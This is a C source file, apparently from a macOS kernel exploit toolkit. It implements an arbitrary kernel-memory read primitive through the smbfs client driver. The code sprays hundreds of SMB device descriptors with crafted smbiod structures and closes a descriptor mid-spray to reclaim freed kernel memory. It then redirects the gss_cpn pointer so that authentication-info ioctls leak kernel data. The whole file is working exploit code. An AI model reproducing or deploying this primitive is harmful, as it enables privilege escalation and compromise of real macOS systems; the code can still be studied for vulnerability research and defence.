//
//  kmem_smbiod_rw.c
//  kmem_xepg
//
//  Created by admin on 1/1/22.
//

#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <dispatch/dispatch.h>

#include <xe/memory/kmem.h>
#include <xe/util/assert.h>
#include <xe/util/log.h>

#include "../external/smbfs/smb_conn.h"
#include "../smb/client.h"

#include "kmem_smbiod.h"


#define MAX_READ_SIZE UINT32_MAX
#define MAX_WRITE_SIZE UINT32_MAX
#define KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT 650


struct kmem_smbiod_backend_ctx {
    struct sockaddr_in smb_addr;
    int fd_rw;
    int fd_iod;
};


void kmem_smbiod_ctx_read_iod(struct kmem_smbiod_backend_ctx* ctx, struct smbiod* out) {
    struct smbiod iod1;
    struct smbiod iod2;
    
    uint32_t gss_target_nt;
    int error = smb_client_ioc_auth_info(ctx->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &gss_target_nt);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(ctx->fd_rw, (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2), NULL);
    xe_assert_err(error);
    
    if (iod1.iod_gss.gss_target_nt == gss_target_nt && xe_vm_kernel_address_valid((uintptr_t)iod1.iod_tdesc)) {
        *out = iod1;
    } else if (iod2.iod_gss.gss_target_nt == gss_target_nt && xe_vm_kernel_address_valid((uintptr_t)iod2.iod_tdesc)) {
        *out = iod2;
    } else {
        xe_log_error("read failed, gss_target_nt does not match");
        abort();
    }
}


void kmem_smbiod_ctx_write_iod(struct kmem_smbiod_backend_ctx* ctx, const struct smbiod* value) {
    xe_log_debug("kmem_smbiod iod write start");
    int* fds_capture = alloca(sizeof(int) * KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        fds_capture[index] = smb_client_open_dev();
        xe_assert(fds_capture[index] >= 0);
        int error = smb_client_ioc_negotiate(fds_capture[index], &ctx->smb_addr, sizeof(ctx->smb_addr), FALSE);
        xe_assert_err(error);
    });
    
    uint32_t gss_target_nt_base = rand();
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (index == 32) { close(ctx->fd_rw); }
        struct smbiod iod1 = *value;
        iod1.iod_gss.gss_target_nt = gss_target_nt_base + (int)index * 2;
        struct smbiod iod2 = *value;
        iod2.iod_gss.gss_target_nt = iod1.iod_gss.gss_target_nt + 1;
        int error = smb_client_ioc_ssn_setup(fds_capture[index], (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2));
        if (error) {
            xe_log_warn("smb ssn setup failed, err: %s\n", strerror(error));
        }
    });
    
    uint32_t new_gss_target_nt;
    int error = smb_client_ioc_auth_info(ctx->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &new_gss_target_nt);
    xe_assert_err(error);
    
    if ((new_gss_target_nt - gss_target_nt_base) % 2 == 0) {
        xe_log_debug("captured by gss_cpn");
    } else {
        xe_log_debug("captured by gss_spn");
    }
    
    int captured_idx = (new_gss_target_nt - gss_target_nt_base) / 2;
    xe_assert_cond(captured_idx, >=, 0)
    xe_assert_cond(captured_idx, <, KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    ctx->fd_rw = fds_capture[captured_idx];
    
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (index != captured_idx) {
            close(fds_capture[index]);
        }
    });
    
    xe_log_debug("kmem_smbiod iod write complete");
}


void kmem_smbiod_read_iod(kmem_smbiod_backend_t backend, struct smbiod* out) {
    kmem_smbiod_ctx_read_iod(backend->ctx, out);
}


void kmem_smbiod_write_iod(kmem_smbiod_backend_t backend, const struct smbiod* value) {
    kmem_smbiod_ctx_write_iod(backend->ctx, value);
}


void kmem_smbiod_read(void* ctx, void* dst, uintptr_t src, size_t size) {
    xe_assert(size <= MAX_READ_SIZE);
    xe_assert(size <= UINT32_MAX);
    struct smbiod iod;
    kmem_smbiod_ctx_read_iod(ctx, &iod);
    xe_assert_kaddr((uintptr_t)iod.iod_tdesc);
    iod.iod_gss.gss_cpn = (uint8_t*)src;
    iod.iod_gss.gss_cpn_len = (uint32_t)size;
    kmem_smbiod_ctx_write_iod(ctx, &iod);
    struct kmem_smbiod_backend_ctx* backend_ctx = (struct kmem_smbiod_backend_ctx*)ctx;
    int error = smb_client_ioc_auth_info(backend_ctx->fd_iod, (char*)dst, (uint32_t)size, NULL, UINT32_MAX, NULL);
    xe_assert_err(error);
}


void kmem_smbiod_write(void* ctx, uintptr_t dst, void* src, size_t size) {
    xe_log_error("write not supported by kmem_smbiod");
    abort();
}


static struct xe_kmem_ops kmem_smbiod_ops = {
    .read = kmem_smbiod_read,
    .max_read_size = MAX_READ_SIZE,
    .write = kmem_smbiod_write,
    .max_write_size = MAX_WRITE_SIZE
};


kmem_smbiod_backend_t kmem_smbiod_create(const struct sockaddr_in* smb_addr, int fd_rw, int fd_iod) {
    struct kmem_smbiod_backend_ctx* ctx = malloc(sizeof(struct kmem_smbiod_backend_ctx));
    ctx->smb_addr = *smb_addr;
    ctx->fd_rw = fd_rw;
    ctx->fd_iod = fd_iod;
    
    struct xe_kmem_backend* backend = malloc(sizeof(struct xe_kmem_backend));
    backend->ops = &kmem_smbiod_ops;
    backend->ctx = ctx;
    
    return backend;
}


void kmem_smbiod_destroy(struct xe_kmem_backend** backend_p) {
    struct xe_kmem_backend* backend = *backend_p;
    free(backend);
    *backend_p = NULL;
}
